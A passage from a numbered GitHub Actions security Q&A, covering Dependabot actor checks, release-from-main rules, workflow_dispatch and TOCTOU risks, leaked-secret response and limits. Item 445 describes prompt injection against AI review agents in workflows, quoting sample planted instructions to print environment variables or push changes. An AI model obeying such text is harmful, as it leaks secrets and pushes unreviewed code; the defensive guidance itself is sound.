This matters for checks like "is this run from a bot": if a maintainer re-runs a Dependabot pull request job, `github.actor` is still `dependabot[bot]`, but `triggering_actor` is the maintainer. And when someone else pushes to a Dependabot branch, the actor changes.

For security decisions, don't trust `github.actor` alone. Check the data that matters directly, like `github.event.pull_request.user.login` for who opened the pull request, and the commits' authors if needed.

## 437: Why is checking github.actor == 'dependabot[bot]' risky?

Workflows often skip steps or auto-approve when the actor is Dependabot. But `github.actor` is the user who caused the latest event, not who wrote the code. Known problems:

- Security researchers have shown ways to make `dependabot[bot]` the actor of an event on a pull request that contains someone else's code, for example by getting Dependabot to update a branch the attacker controls. The check passes, but the code is the attacker's.
- In `pull_request_target` workflows, such checks have been used to bypass review and get a privileged token.

Safer checks: use `github.event.pull_request.user.login == 'dependabot[bot]'` (who opened the pull request), verify with `dependabot/fetch-metadata` which fails if commits come from others, and never run privileged steps on pull request code because of an actor check alone.

## 438: How do you make sure releases are only built from reviewed code on main?

- Protect release tags with a tag ruleset, so only a release bot or maintainers can create `v*` tags.
- In the release workflow, check that the tagged commit is on `main`:

```yaml
- uses: actions/checkout@v6
  with:
    fetch-depth: 0
- run: git merge-base --is-ancestor "$GITHUB_SHA" origin/main
```

- Put the publish job behind an environment whose deployment rules only allow `v*` tags, so a tag created elsewhere can't use the publishing credentials.
- Use trusted publishing or OIDC roles that trust only that environment.
- Create provenance attestations, so consumers can verify the package came from that workflow and commit.

## 439: What are the risks of workflow_dispatch with a ref?

`workflow_dispatch` runs the workflow file and the code from the ref the user picks, which can be any branch. Someone with write access can push a branch with a changed deploy workflow and dispatch it, and if the workflow uses repository secrets, those secrets are exposed to the changed code.

Protections:

- Put deploy secrets on environments with deployment branch rules, so a dispatch from an unapproved branch can't use them.
- Check the ref in the workflow (`github.ref == 'refs/heads/main'`), knowing that this check lives in the branch's version of the file and can be removed there, so it's not enough alone.
- Validate inputs strictly (choice inputs, regex checks for versions).
- Limit who has write access to the repository.

## 440: What are the security concerns with job containers and Docker on runners?

- On Linux hosted runners, the runner user can use Docker and `sudo`, so any step effectively has root on the VM. That's fine on a throwaway VM, but not on a persistent self-hosted machine.
- Job containers usually run as root and have the Docker socket of the host available in some setups. Access to the Docker socket equals root on the host.
- On self-hosted runners, a job that runs privileged containers can escape to the host and affect other jobs.
- Images pulled by tag can change. Pin by digest for sensitive jobs.

For self-hosted runners, use ephemeral VMs or pods, avoid exposing the Docker socket, and prefer rootless builders.

## 441: How do you build images on Kubernetes runners without privileged containers?

The usual `docker build` needs a Docker daemon, which in Kubernetes typically means a privileged `dind` sidecar. Alternatives:

- **BuildKit in rootless mode**, run as a separate service (a BuildKit deployment) that runners connect to with `docker buildx create --driver remote`.
- **Buildx Kubernetes driver**, which starts BuildKit pods in the cluster for each builder.
- **Kaniko**-style builders, which build images from a Dockerfile in user space (check the current maintenance status of the tool you pick).
- **Buildah or Podman** in rootless mode.
- Moving image builds to GitHub-hosted runners while keeping other jobs on internal runners.

Each option has trade-offs in caching and compatibility, so test with your Dockerfiles before switching.

## 442: How do you deal with time zones and daylight saving time in schedules?

Cron in GitHub Actions uses UTC. A job set for `0 7 * * *` runs at 07:00 UTC all year, which is 8:00 or 9:00 in Central Europe depending on daylight saving time.

Options:

- Accept the one-hour shift.
- Schedule two crons (one for summer time, one for winter time) and have the job check the local time and exit early if it's the wrong one.
- Schedule more often (for example every hour) and let a script decide whether it's the right local time to act.

```bash
if [ "$(TZ=Europe/Berlin date +%H)" != "08" ]; then echo "Not 8:00 in Berlin"; exit 0; fi
```

Also remember scheduled runs can be late, so don't depend on exact minutes.

## 443: What is the TOCTOU problem in label or approval based workflows?

TOCTOU means "time of check to time of use". A maintainer reviews a pull request and adds a label like `safe-to-test`, which starts a privileged workflow. Between the label being added and the workflow checking out the code, the author pushes a new malicious commit. The workflow then checks out the latest branch head and runs code nobody reviewed.

Fix it by using the exact commit that was reviewed:

- Check out `github.event.pull_request.head.sha` from the label event, not the branch name.
- Remove the label automatically on every new push (`synchronize`), so each new commit needs a new review.
- Prefer environment approvals, which show exactly which run (and commit) is approved.

## 444: How should you handle GitHub Actions outages in your delivery process?

- Have a documented manual fallback for urgent production fixes, such as a script that can deploy a specific image digest from a secure admin machine, with the same checks.
- Keep artifacts and images in registries you control, so you can deploy without Actions.
- Make workflows safe to re-run after an outage, because runs may be cancelled or stuck halfway.
- Watch GitHub's status page and changelog, and subscribe to incidents.
- For critical self-hosted setups, monitor queue times so you can tell your own runner problems apart from GitHub problems.

Don't build a whole second CI system for rare outages, but make sure an emergency deploy doesn't depend on a single service being up.

## 445: How do you run AI-based code review or agents in GitHub Actions safely?

AI tools that read pull requests and run in workflows add a new kind of risk: **prompt injection**. Text in a pull request, issue or comment can contain instructions that the AI follows, for example "print all environment variables" or "push this change".

Safer setup:

- Treat the AI's output like untrusted input. Don't let it run shell commands or push code with write access on pull requests from outsiders.
- Give the job minimal `permissions` (often `contents: read` and `pull-requests: write` for comments only) and no other secrets than the AI provider key.
- Trigger it only on `pull_request` (not `pull_request_target`) for forks, or only for members, or on a label added by a maintainer.
- Limit which tools and commands the agent can use, and restrict network access.
- Review agent-made changes like any other contributor's pull request.

## 446: How do you limit what a workflow can do when it creates pull requests?

By default, `GITHUB_TOKEN` can't create or approve pull requests unless the organization or repository setting "Allow GitHub Actions to create and approve pull requests" is turned on. Keep approving off: a workflow approving its own pull request would bypass required reviews.

If automation must open pull requests (dependency updates, generated code, release pull requests), use a dedicated GitHub App with only the permissions needed, and still require a human review before merging. Make the App's pull requests easy to recognize (labels, a clear title prefix), and don't give the App bypass rights on rulesets unless there's no other way.

## 447: How do you investigate a run where secrets might have leaked?

1. Look at the logs of the affected runs for masked (`***`) and unmasked values, and check artifacts and job summaries, which may contain values that aren't masked.
2. Delete the logs of affected runs if they are public (you can delete workflow run logs in the UI or API).
3. Check the workflow and action versions that ran, and what changed recently.
4. Check outbound network activity if you have runner network monitoring.
5. Rotate every secret available to those jobs, not only the one you saw.
6. Check the services the secrets protect (cloud audit logs, npm publish history, GitHub audit log) for use from unknown places.
7. Fix the root cause: injection, compromised action, debug print or wrong trigger.

Assume a secret is compromised as soon as it might have been exposed. Rotating is cheap compared to the alternative.

## 448: What are the main limits of GitHub Actions you should know by heart?

- Job execution time: 6 hours on GitHub-hosted runners, 5 days on self-hosted.
- Workflow run time: 35 days (including waiting for approvals).
- Matrix: 256 jobs per matrix.
- Reusable workflows: 10 levels of nesting, 50 workflows per run.
- `workflow_dispatch`: 25 inputs.
- Queued self-hosted jobs: cancelled after 24 hours without a runner.
- Cache: 10 GB per repository by default, unused entries removed after 7 days.
- Artifacts and logs: 90 days retention by default.
- `GITHUB_TOKEN` API calls: 1,000 per hour per repository.
- Secrets: 48 KB each.
- Job summary: 1 MiB per step.

Limits change over time, so check the "Usage limits" page in the docs when it matters.

## 449: What changed in GitHub Actions recently that you should know about?

Some notable changes from 2025 and 2026:

- JavaScript actions moved to Node.js 24. Node 20 was deprecated and removed from hosted runners, so many official actions released new majors with `using: node24`.
- Arm64 hosted runners for Linux and Windows became generally available, free for public repositories.
- Reusable workflow limits went up to 10 levels and 50 workflows per run, and `workflow_dispatch` allows 25 inputs.
- YAML anchors and aliases are supported in workflow files.
- Organizations can require actions to be pinned to full SHAs and block specific actions, and immutable releases became available.
- `pull_request_target` now always uses the workflow from the default branch.
- `actions/checkout` v6 stores credentials outside `.git/config`.
- Hosted runner prices were lowered in 2026, and GitHub published a security roadmap with dependency locking, a native egress firewall and scoped secrets.
- The runner scale set client was released in preview for autoscaling without Kubernetes.

## 450: What good practices do you apply to every workflow?

- Set `permissions` explicitly, with the least access needed, per job.
- Pin third-party actions to full commit SHAs, and keep them updated with Dependabot or Renovate.
- Never put untrusted input in `${{ }}` inside `run`. Pass it through `env`.
- Don't run untrusted code with secrets: avoid checking out pull request code in `pull_request_target`, `workflow_run` and `issue_comment`.
- Use OIDC instead of long-lived cloud keys, and environments with protection rules for deploys.
- Set `timeout-minutes` on jobs.
- Use `concurrency` to cancel outdated CI runs and serialize deploys.
- Cache dependencies, and upload useful artifacts with short retention.
- Give workflows, jobs and steps clear names, and write job summaries.
- Lint workflows with `actionlint` and `zizmor`, and protect `.github/` with CODEOWNERS.
